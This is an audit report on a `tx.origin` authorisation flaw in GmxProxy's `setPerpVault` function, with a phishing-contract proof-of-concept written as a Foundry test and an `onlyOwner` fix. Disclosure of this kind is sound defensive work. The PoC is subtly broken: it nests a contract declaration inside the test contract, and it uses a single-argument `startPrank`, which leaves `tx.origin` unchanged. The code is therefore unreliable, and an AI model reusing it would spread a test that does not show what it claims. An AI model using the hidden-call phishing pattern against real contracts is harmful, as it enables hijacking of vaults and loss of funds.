
# Gamma - Liquidity Management


## Summary

The `setPerpVault` function in GmxProxy.sol  uses `tx.origin` for authorization instead of `msg.sender`. This critical vulnerability allows malicious contracts to bypass ownership checks and potentially gain control over vault interactions with GMX.

## Vulnerability Details

```solidity
function setPerpVault(address _perpVault, address market) external {
    require(tx.origin == owner(), "not owner"); // @audit Uses tx.origin
    require(_perpVault != address(0), "zero address");
    require(perpVault == address(0), "already set");
    perpVault = _perpVault;
    gExchangeRouter.setSavedCallbackContract(market, address(this));
}
```

The function relies on `tx.origin` for authorization, which represents the original external account that initiated the transaction, rather than the immediate caller (`msg.sender`).

## Impact

1. Malicious contracts can trick vault owner into interacting with them
2. Potential redirection of all GMX interactions
3. Complete compromise of vault controls
4. Risk of fund loss through manipulated callbacks

## Proof of Concept

The Proof of Concept demonstrates how an attacker can exploit the tx.origin authentication in GmxProxy to hijack the vault system through a phishing contract:

1. Setup:
   * Deploy GmxProxy with legitimate owner
   * Attacker creates a malicious vault contract
   * Attacker deploys a phishing contract appearing legitimate to owners

2. Attack Flow:
   * The phishing contract includes legitimate-looking functions (e.g., 'claim')
   * When owner interacts with the phishing contract
   * The contract secretly calls setPerpVault during execution
   * Since tx.origin matches owner, the call succeeds
   * Malicious vault becomes the authorized vault

3. Impact:
   * Attacker gains control of vault interactions
   * All future GMX operations can be intercepted
   * System security is compromised despite owner's careful setup

The test provides concrete proof that using tx.origin for authentication creates a critical security weakness, allowing attackers to bypass intended access controls through indirect contract interactions.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "forge-std/Test.sol";
import "../../contracts/GmxProxy.sol";

contract TxOriginAttackTest is Test {
    GmxProxy proxy;
    address owner;
    address attacker;
    
    function setUp() public {
        owner = address(0x1);
        attacker = address(0x2);
        
        vm.startPrank(owner);
        proxy = new GmxProxy();
        proxy.initialize(
            address(0x100), // orderHandler
            address(0x101), // liquidationHandler
            address(0x102), // adlHandler
            address(0x103), // gExchangeRouter
            address(0x104), // gmxRouter
            address(0x105), // dataStore
            address(0x106), // orderVault
            address(0x107), // gmxReader
            address(0x108)  // referralStorage
        );
        vm.stopPrank();
    }
    
    // Malicious contract that owner might interact with
    contract AttackerContract {
        GmxProxy public targetProxy;
        address public attackerControlledVault;
        
        constructor(address _proxy, address _maliciousVault) {
            targetProxy = GmxProxy(_proxy);
            attackerControlledVault = _maliciousVault;
        }
        
        function attack() external {
            // When owner interacts with this contract
            targetProxy.setPerpVault(
                attackerControlledVault,
                address(0x1234) // market
            );
        }
        
        // Legitimate-looking function that owner might call
        function claim() external {
            // Hidden malicious call
            attack();
        }
    }
    
    function testTxOriginAttack() public {
        // Deploy attacker's malicious vault
        address maliciousVault = address(new MaliciousVault());
        
        // Deploy malicious contract
        AttackerContract attackerContract = new AttackerContract(
            address(proxy),
            maliciousVault
        );
        
        // Owner interacts with attacker contract thinking it's legitimate
        vm.startPrank(owner);
        attackerContract.claim();
        
        // Verify attack success
        assertEq(proxy.perpVault(), maliciousVault);
        vm.stopPrank();
    }
}

contract MaliciousVault {
    // Malicious vault implementation
}
```

The PoC demonstrates how a malicious contract can trick the vault owner into unknowingly setting a malicious vault address, potentially compromising the entire system's security.

## Tools Used

* Manual code review
* Foundry testing framework
* Static analysis (detecting tx.origin usage)

## Recommended Mitigation

Replace tx.origin with msg.sender and use OpenZeppelin's onlyOwner modifier:

```solidity
function setPerpVault(address _perpVault, address market) external onlyOwner {
    require(_perpVault != address(0), "zero address");
    require(perpVault == address(0), "already set");
    perpVault = _perpVault;
    gExchangeRouter.setSavedCallbackContract(market, address(this));
}
```
